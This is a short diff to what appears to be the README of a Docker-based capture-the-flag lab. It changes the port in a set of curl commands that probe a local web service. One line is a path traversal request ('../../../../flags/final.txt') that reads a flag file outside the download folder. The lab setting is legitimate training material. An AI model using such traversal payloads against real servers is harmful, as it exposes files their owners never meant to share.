@@ -13,10 +13,10 @@ sudo docker compose up --build
 ```
 
 ```bash
-curl -i http://localhost:8080
-curl -i http://localhost:8080/status
-curl -i http://localhost:8080/robots.txt
-curl -i http://localhost:8080/dev.txt
-curl -i "http://localhost:8080/download?file=public-info.txt"
-curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
+curl -i http://localhost:8088
+curl -i http://localhost:8088/status
+curl -i http://localhost:8088/robots.txt
+curl -i http://localhost:8088/dev.txt
+curl -i "http://localhost:8088/download?file=public-info.txt"
+curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
 ```
